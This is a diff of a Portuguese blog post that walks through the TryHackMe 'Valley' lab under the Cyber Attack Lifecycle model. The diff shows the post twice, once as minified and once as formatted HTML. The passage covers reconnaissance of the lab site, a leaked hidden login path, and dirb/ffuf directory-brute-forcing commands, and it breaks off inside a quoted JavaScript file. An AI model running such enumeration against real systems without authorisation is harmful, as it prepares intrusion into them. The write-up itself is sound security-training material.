@@ -1,151 +1,504 @@
-<!doctype html><html lang=en-gb><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=32807&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=content-type content="text/html"><meta name=viewport content="width=device-width,initial-scale=1"><title itemprop=name>Máquina Valley do TryHackMe e o ciclo de vida de um ciberataque | Obtuosa</title>
-<meta property="og:title" content="Máquina Valley do TryHackMe e o ciclo de vida de um ciberataque | Obtuosa"><meta name=twitter:title content="Máquina Valley do TryHackMe e o ciclo de vida de um ciberataque | Obtuosa"><meta itemprop=name content="Máquina Valley do TryHackMe e o ciclo de vida de um ciberataque | Obtuosa"><meta name=application-name content="Máquina Valley do TryHackMe e o ciclo de vida de um ciberataque | Obtuosa"><meta property="og:site_name" content="Obtuosa"><meta name=description content="Um texto com o objetivo de compreender um cenário simples de ataque com uma máquina do tryhackme"><meta itemprop=description content="Um texto com o objetivo de compreender um cenário simples de ataque com uma máquina do tryhackme"><meta property="og:description" content="Um texto com o objetivo de compreender um cenário simples de ataque com uma máquina do tryhackme"><meta name=twitter:description content="Um texto com o objetivo de compreender um cenário simples de ataque com uma máquina do tryhackme"><meta property="og:locale" content="en-gb"><meta name=language content="en-gb"><link rel=alternate hreflang=en-gb href=http://localhost:32807/posts/maquina-valley/ title=English><meta itemprop=image content="http://localhost:32807/images/valley.png"><meta property="og:image" content="http://localhost:32807/images/valley.png"><meta name=twitter:image content="http://localhost:32807/images/valley.png"><meta name=twitter:image:src content="http://localhost:32807/images/valley.png"><meta property="og:type" content="article"><meta property="og:article:published_time" content=2024-09-22T00:00:00Z><meta property="article:published_time" content=2024-09-22T00:00:00Z><meta property="og:url" content="http://localhost:32807/posts/maquina-valley/"><meta property="og:article:author" content><meta property="article:author" content><meta name=author content><script defer type=application/ld+json>{"@context":"http://schema.org","@type":"Article","headline":"Máquina Valley do TryHackMe e o ciclo de vida de um ciberataque","author":{"@type":"Person","name":""},"datePublished":"2024-09-22","description":"Um texto com o objetivo de compreender um cenário simples de ataque com uma máquina do tryhackme","wordCount":3168,"mainEntityOfPage":"True","dateModified":"2024-09-22","image":{"@type":"imageObject","url":"http:\/\/localhost:32807\/images\/valley.png"},"publisher":{"@type":"Organization","name":"Obtuosa"}}</script><meta name=generator content="Hugo 0.131.0"><meta property="og:url" content="http://localhost:32807/posts/maquina-valley/"><meta property="og:site_name" content="Obtuosa"><meta property="og:title" content="Máquina Valley do TryHackMe e o ciclo de vida de um ciberataque"><meta property="og:description" content="Um texto com o objetivo de compreender um cenário simples de ataque com uma máquina do tryhackme"><meta property="og:locale" content="en_gb"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-09-22T00:00:00+00:00"><meta property="article:modified_time" content="2024-09-22T00:00:00+00:00"><meta property="article:tag" content="Valley"><meta property="article:tag" content="Tryhackme"><meta property="article:tag" content="Cybersecurity"><meta property="article:tag" content="Cyber-Attack-Lifecycle"><meta name=twitter:card content="summary"><meta name=twitter:title content="Máquina Valley do TryHackMe e o ciclo de vida de um ciberataque"><meta name=twitter:description content="Um texto com o objetivo de compreender um cenário simples de ataque com uma máquina do tryhackme"><link rel=canonical href=http://localhost:32807/posts/maquina-valley/><link href=/style.min.2d921c18cf1ec555ffc03d59a8adc211c402c68c930c27d6a0c306ab175a8d09.css rel=stylesheet><link href=/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css rel=stylesheet><link rel=apple-touch-icon sizes=180x180 href=/icons/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/icons/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/icons/favicon-16x16.png><link rel=mask-icon href=/icons/safari-pinned-tab.svg><link rel="shortcut icon" href=/favicon.ico><link rel=manifest href=http://localhost:32807/site.webmanifest><meta name=msapplication-config content="/browserconfig.xml"><meta name=msapplication-TileColor content="#2d89ef"><meta name=theme-color content="#434648"><link rel=icon type=image/svg+xml href=/icons/favicon.svg></head><body data-theme=dark class=notransition><script src=/js/theme.js></script><div class=navbar role=navigation><nav class=menu aria-label="Main Navigation"><a href=http://localhost:32807/ class=logo><svg width="25" height="25" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-home"><title>Home</title><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
-</a><input type=checkbox id=menu-trigger class=menu-trigger>
-<label for=menu-trigger><span class=menu-icon><svg width="25" height="25" stroke="currentcolor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7H3.40726"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M.5 12.5V1.5c0-.552285.447715-1 1-1h11C13.0523.5 13.5.947715 13.5 1.5v11C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C.947715 13.5.5 13.0523.5 12.5z"/></svg></span></label><div class=trigger><ul class=trigger-container><li><a class=menu-link href=/>Início</a></li><li><a class="menu-link active" href=/posts/>Posts</a></li><li><a class=menu-link href=/pages/about/>Whoami</a></li><li class=menu-separator><span>|</span></li></ul><a id=mode href=#><svg class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg><svg class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg></a></div></nav></div><div class="wrapper post"><main class=page-content aria-label=Content><article><header class=header><h1 class=header-title>Máquina Valley do TryHackMe e o ciclo de vida de um ciberataque</h1><div class=post-meta><time datetime=2024-09-22T00:00:00+00:00 itemprop=datePublished>22 Sep 2024</time></div></header><div class=page-content><p><img alt=Valley src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/2ekhhzw9tqd1f4glichy.png></p><h1 id=máquina-valley-do-tryhackme--e-o-ciclo-de-vida-de-um-ciberataque>Máquina valley do TryhackMe e o ciclo de vida de um ciberataque</h1><p>Quando se pensa em um ciberataque podemos imaginar principalmente sobre a metodologia utilizada por um determinado atacante. Desta maneira, traçar os passos que foram adotados até suceder o ataque é muito importante, se questionando sobre <strong>o que o atacante faria?</strong> diante por exemplo de uma aplicação web, que é justamente o nosso alvo exemplo. O principal objetivo desse texto é dissecar o processo até o encontro das flags da hacking lab, mas assimilando com os conceitos de <a href=https://www.iacpcybercenter.org/resource-center/what-is-cyber-crime/cyber-attack-lifecycle/><strong>Cyber Attack Lifecycle</strong></a>, já que podemos observar como o nosso atacante poderia operar nesse contexto. Logo, a ideia é trazer essa pequena percepção de um ciberataque do mundo real, mas de maneira bem <strong>simples</strong> e é claro que de <strong>maneira legal</strong>, com a room <a href=https://tryhackme.com/r/room/valleype><strong>Valley</strong></a>, da plataforma TryHackMe.</p><h2 id=introdução>Introdução</h2><p>Antes de começar o processo de análise e resolução da máquina é importante explicar o que seria um Cyber Attack Lifecycle ou Attack Lifecycle (Ciclo de vida do ataque cibernético / Ciclo de vida do ataque), porque é justamente a partir dessa metodologia que se inicia os passos de invasão à máquina Valley.</p><p>Uma metodologia na perspectiva de um hacking ético é basicamente mapear o processo de um ataque, de acordo com o contexto e objetivo do autor. Deste modo, iremos usar como base um modelo bem interessante: <strong>Attack Lifecycle</strong>, através dele podemos observar de maneira detalhada o passo a passo do invasor.</p><h3 id=attack-lifecycle>Attack Lifecycle</h3><hr><p><img alt="Modelo de ciclo de um ataque" src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/2fow7hmqzdt86i9yd7y7.jpg>
-É muito interessante como este modelo descreve, de maneira sucinta e bastante objetiva como um explorador executa seu respectivo ataque. Uma curiosidade pontuada é que um possível ataque não é único, assim como é tratado no livro do <strong>Ric Messier</strong> intitulado <strong>CEH v12 Certified Ethical Hacker Study Guide with 750 Practice Test Questions</strong>, ou seja, muito provavelmente o mesmo não irá com objetivo de realizar apenas um ataque e pronto, o <strong>one-and-done</strong>, mas sim a partir de um determinado ataque continuar buscando novas brechas. Neste processo iremos realizar a análise de etapa por etapa através da própria máquina juntamente com as definições.</p><h3 id=initial-recon>Initial Recon</h3><hr><p>O Initial Recon (reconhecimento inicial) é justamente o momento em que buscamos informações sobre o alvo. Dessa maneira, quais informações podemos retirar sobre a vítima?</p><p><img alt="Página inicial da Valley Photo" src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/rqchu1349ai45ujtwap4.png>
-Aqui podemos ter algumas informações, a primeira é se tratando de uma empresa com foco em fotografias, a <strong>Valley Photo Co.</strong>, uma aplicação web, que curiosamente é via <a href=https://www.alura.com.br/artigos/http><strong>HTTP</strong></a>, com isso já podemos tirar que os dados ali transmitidos não são criptografados, com isso podemos tentar buscar informações de possíveis dados sensíveis, além de possuir três rotas que são: <strong>/index.html</strong>, <strong>/gallery/gallery.html</strong> e <strong>/pricing/pricing.html</strong>.
+<!DOCTYPE html>
+<html lang="en-gb"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=44215&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">Máquina Valley do TryHackMe e o ciclo de vida de um ciberataque | Obtuosa</title>
+<meta property="og:title" content="Máquina Valley do TryHackMe e o ciclo de vida de um ciberataque | Obtuosa" />
+<meta name="twitter:title" content="Máquina Valley do TryHackMe e o ciclo de vida de um ciberataque | Obtuosa" />
+<meta itemprop="name" content="Máquina Valley do TryHackMe e o ciclo de vida de um ciberataque | Obtuosa" />
+<meta name="application-name" content="Máquina Valley do TryHackMe e o ciclo de vida de um ciberataque | Obtuosa" />
+<meta property="og:site_name" content="Obtuosa" />
+
+<meta name="description" content="Um texto com o objetivo de compreender um cenário simples de ataque com uma máquina do tryhackme">
+<meta itemprop="description" content="Um texto com o objetivo de compreender um cenário simples de ataque com uma máquina do tryhackme" />
+<meta property="og:description" content="Um texto com o objetivo de compreender um cenário simples de ataque com uma máquina do tryhackme" />
+<meta name="twitter:description" content="Um texto com o objetivo de compreender um cenário simples de ataque com uma máquina do tryhackme" />
+
+<meta property="og:locale" content="en-gb" />
+<meta name="language" content="en-gb" />
+
+  <link rel="alternate" hreflang="en-gb" href="http://localhost:44215/posts/maquina-valley/" title="English" />
+
+
+<meta itemprop="image" content="http://localhost:44215/images/valley.png" />
+<meta property="og:image" content="http://localhost:44215/images/valley.png" />
+<meta name="twitter:image" content="http://localhost:44215/images/valley.png" />
+<meta name="twitter:image:src" content="http://localhost:44215/images/valley.png" />
+
+
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2024-09-22T00:00:00Z />
+    <meta property="article:published_time" content=2024-09-22T00:00:00Z />
+    <meta property="og:url" content="http://localhost:44215/posts/maquina-valley/" />
+
+    
+    <meta property="og:article:author" content="" />
+    <meta property="article:author" content="" />
+    <meta name="author" content="" />
+    
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "Máquina Valley do TryHackMe e o ciclo de vida de um ciberataque",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2024-09-22",
+        "description": "Um texto com o objetivo de compreender um cenário simples de ataque com uma máquina do tryhackme",
+        "wordCount":  3168 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2024-09-22",
+        "image": {
+        "@type": "imageObject",
+        "url": "http:\/\/localhost:44215\/images\/valley.png"
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "Obtuosa"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.131.0">
+
+    
+    <meta property="og:url" content="http://localhost:44215/posts/maquina-valley/">
+  <meta property="og:site_name" content="Obtuosa">
+  <meta property="og:title" content="Máquina Valley do TryHackMe e o ciclo de vida de um ciberataque">
+  <meta property="og:description" content="Um texto com o objetivo de compreender um cenário simples de ataque com uma máquina do tryhackme">
+  <meta property="og:locale" content="en_gb">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-09-22T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-09-22T00:00:00+00:00">
+    <meta property="article:tag" content="Valley">
+    <meta property="article:tag" content="Tryhackme">
+    <meta property="article:tag" content="Cybersecurity">
+    <meta property="article:tag" content="Cyber-Attack-Lifecycle">
+
+
+    
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Máquina Valley do TryHackMe e o ciclo de vida de um ciberataque">
+  <meta name="twitter:description" content="Um texto com o objetivo de compreender um cenário simples de ataque com uma máquina do tryhackme">
+
+    
+
+    
+
+    <link rel="canonical" href="http://localhost:44215/posts/maquina-valley/">
+    <link href="/style.min.2d921c18cf1ec555ffc03d59a8adc211c402c68c930c27d6a0c306ab175a8d09.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="http://localhost:44215/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    
+
+</head>
+<body data-theme = "dark" class="notransition">
+
+<script src="/js/theme.js"></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="http://localhost:44215/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+    
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Início
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/posts/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/pages/about/">
+                        Whoami
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">Máquina Valley do TryHackMe e o ciclo de vida de um ciberataque</h1>
+                
+                
+                
+                <div class="post-meta">
+                    <time datetime="2024-09-22T00:00:00&#43;00:00" itemprop="datePublished"> 22 Sep 2024 </time>
+                </div>
+                
+            </header>
+            
+            <div class="page-content">
+                <p><img alt="Valley" src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/2ekhhzw9tqd1f4glichy.png"></p>
+<h1 id="máquina-valley-do-tryhackme--e-o-ciclo-de-vida-de-um-ciberataque">Máquina valley do TryhackMe  e o ciclo de vida de um ciberataque</h1>
+<p>Quando se pensa em um ciberataque podemos imaginar principalmente sobre a metodologia utilizada por um determinado atacante. Desta maneira, traçar os passos que foram adotados até suceder o ataque é muito importante, se questionando sobre <strong>o que o atacante faria?</strong> diante por exemplo de uma aplicação web, que é justamente o nosso alvo exemplo. O principal objetivo desse texto é dissecar o processo até o encontro das flags da hacking lab, mas assimilando com os conceitos de <a href="https://www.iacpcybercenter.org/resource-center/what-is-cyber-crime/cyber-attack-lifecycle/"><strong>Cyber Attack Lifecycle</strong></a>, já que podemos observar como o nosso atacante poderia operar nesse contexto. Logo, a ideia é trazer essa pequena percepção de um ciberataque do mundo real, mas de maneira bem <strong>simples</strong> e é claro que de <strong>maneira legal</strong>, com a room <a href="https://tryhackme.com/r/room/valleype"><strong>Valley</strong></a>, da plataforma TryHackMe.</p>
+<h2 id="introdução">Introdução</h2>
+<p>Antes de começar o processo de análise e resolução da máquina é importante explicar o que seria um Cyber Attack Lifecycle ou Attack Lifecycle (Ciclo de vida do ataque cibernético / Ciclo de vida do ataque), porque é justamente a partir dessa metodologia que se inicia os passos de invasão à máquina Valley.</p>
+<p>Uma metodologia na perspectiva de um hacking ético é basicamente mapear o processo de um ataque, de acordo com o contexto e objetivo do autor. Deste modo, iremos usar como base um modelo bem interessante: <strong>Attack Lifecycle</strong>, através dele podemos observar de maneira detalhada o passo a passo do invasor.</p>
+<h3 id="attack-lifecycle">Attack Lifecycle</h3>
+<hr>
+<p><img alt="Modelo de ciclo de um ataque" src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/2fow7hmqzdt86i9yd7y7.jpg">
+É muito interessante como este modelo descreve, de maneira sucinta e bastante objetiva como um explorador executa seu respectivo ataque. Uma curiosidade pontuada é que um possível ataque não é único, assim como é tratado no livro do <strong>Ric Messier</strong> intitulado <strong>CEH v12 Certified Ethical Hacker Study Guide with 750 Practice Test Questions</strong>, ou seja, muito provavelmente o mesmo não irá com objetivo de realizar apenas um ataque e pronto, o <strong>one-and-done</strong>, mas sim a partir de um determinado ataque continuar buscando novas brechas. Neste processo iremos realizar a análise de etapa por etapa através da própria máquina juntamente com as definições.</p>
+<h3 id="initial-recon">Initial Recon</h3>
+<hr>
+<p>O Initial Recon (reconhecimento inicial) é justamente o momento em que buscamos informações sobre o alvo. Dessa maneira, quais informações podemos retirar sobre a vítima?</p>
+<p><img alt="Página inicial da Valley Photo" src="https://dev-to-uploads.s3.amazonaws.com/uploads/articles/rqchu1349ai45ujtwap4.png">
+Aqui podemos ter algumas informações, a primeira é se tratando de uma empresa com foco em fotografias, a <strong>Valley Photo Co.</strong>, uma aplicação web, que curiosamente é via <a href="https://www.alura.com.br/artigos/http"><strong>HTTP</strong></a>, com isso já podemos tirar que os dados ali transmitidos não são criptografados, com isso podemos tentar buscar informações de possíveis dados sensíveis,  além de possuir três rotas que são: <strong>/index.html</strong>, <strong>/gallery/gallery.html</strong> e <strong>/pricing/pricing.html</strong>.
 O index.html nos trás as informações referentes a página principal da aplicação.
-No gallery.html temos algumas imagens que fazem parte também da rota <strong>/static/</strong> de armazenamento de arquivos e que vai &ldquo;<strong>hipoteticamente</strong>&rdquo; do 1 até até o 18.</p><p><img alt="Galeria de imagens" src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/8yr30ytf7eecxmgsrved.png></p><p><img alt="Rota /static e imagem 1" src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/b80wd2plq37h99f2tnu4.png>
-Enquanto no /pricing.html temos as informações dos valores cobrados pela empresa Valley e informações em uma nota misteriosa se for digitado apenas o IP do alvo + rota /pricing e que informa sobre uma pessoa chamada RP que solicita a J para parar de deixar notas em lugares aleatórios do website. Essa informação deduz que provavelmente terá informações expostas sobre a aplicação em algum lugar e que para isso teremos que usar alguma ferramenta para encontrá-las.</p><p><img alt="Rota pricing" src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/lvgnxcmvrbccuh17bhqa.png></p><p><img alt="Index da rota pricing" src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/k1e4djv7qart7mew7mwr.png></p><p><img alt=Nota.txt src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/imswizmzjewzo73p2vue.png>
-Além disso, podemos presumir que a linguagem que está sendo executada nessa aplicação é <strong>Javascript</strong> em virtude do que foi visto no inspect da aplicação e no próprio html.</p><p><img alt=inspect src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/65se3egrvrsreggffp31.png></p><h3 id=ferramentas>Ferramentas</h3><hr><p>Com a finalização de um reconhecimento inicial mais simples, buscando informações próprias no alvo, iremos partir para a utilização de ferramentas como <strong>dirb</strong>, <strong>ffuf</strong>, etc., que possam primeiramente verificar as rotas, ou seja, uma <strong>enumeração</strong>, para coletar informações sobre a aplicação, identificar as rotas que estão disponíveis, diretórios, qualquer informação oculta que possa contribuir no entendimento do alvo e formas de entrada para um ataque.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>dirb http://alvo/ /usr/share/wordlists/dirb/common.txt
-</span></span><span class=line><span class=cl>dirb http://alvo/pricing /usr/share/wordlists/dirb/common.txt
-</span></span><span class=line><span class=cl>dirb http://alvo/gallery /usr/share/wordlists/dirb/common.txt
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>ffuf -w /usr/share/wordlists/dirb/common.txt -u http://alvo/FUZZ
-</span></span><span class=line><span class=cl>ffuf -w /usr/share/wordlists/dirb/common.txt -u http://alvo/pricing/FUZZ
-</span></span><span class=line><span class=cl>ffuf -w /usr/share/wordlists/dirb/common.txt -u http://alvo/gallery/FUZZ
-</span></span></code></pre></div><p>A principal informação estará justamente na rota /static.</p><p><img alt="Ferramenta dirb" src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/srqnd41976txsnif776t.png></p><p><img alt="Ferramenta ffuf" src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/hwb45nvvbmmvkx5ktb5e.png></p><p><img alt="dev notes" src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/lvh6jnthqa3fypwm4ce0.png>
-Aqui temos informações não muito usuais e que confirma a <strong>note.txt</strong> de que teríamos uma nota perdida em algum lugar e é justamente a rota <strong>/static/00</strong> que possui essa nota. Alguns detalhes podem ser analisados aqui, primeiramente por serem tarefas destinadas a um dev da Valley e que foram solicitadas por outro com user ou referenciado por valleyDev. Dentre essas informações podemos tirar como principal o endereço de login <strong>/dev1243224123123</strong>, que não foi removido pela pessoa e consequentemente estaria no ar ainda.</p><p><img alt="Tela de login" src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/r4411vmt4fed1wbkft28.png>
-Usando as próprias ferramentas do navegador, que é o inspect e a análise da rede podemos tirar mais duas rotas que confirmam a utilização de <strong>Javascript</strong> na aplicação. Se tentar usar as ferramentas anteriores terá dificuldade e provavelmente não irá setar essas rotas disponíveis.</p><p><img alt="Inspect - Network" src=https://dev-to-uploads.s3.amazonaws.com/uploads/articles/v7eefpo6cg5htbtlp9ps.png></p><p>Na rota /dev.js teremos um código bastante interessante:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kr>const</span> <span class=nx>loginForm</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s2>&#34;login-form&#34;</span><span class=p>);</span>
-</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>loginButton</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s2>&#34;login-form-submit&#34;</span><span class=p>);</span>
-</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>loginErrorMsg</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s2>&#34;login-error-msg&#34;</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=nx>loginForm</span><span class=p>.</span><span class=nx>style</span><span class=p>.</span><span class=nx>border</span> <span class=o>=</span> <span class=s1>&#39;2px solid #ccc&#39;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=nx>loginForm</span><span class=p>.</span><span class=nx>style</span><span class=p>.</span><span class=nx>padding</span> <span class=o>=</span> <span class=s1>&#39;20px&#39;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=nx>loginButton</span><span class=p>.</span><span class=nx>style</span><span class=p>.</span><span class=nx>backgroundColor</span> <span class=o>=</span> <span class=s1>&#39;#007bff&#39;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=nx>loginButton</span><span class=p>.</span><span class=nx>style</span><span class=p>.</span><span class=nx>border</span> <span class=o>=</span> <span class=s1>&#39;none&#39;</span><span class=p>;</span>
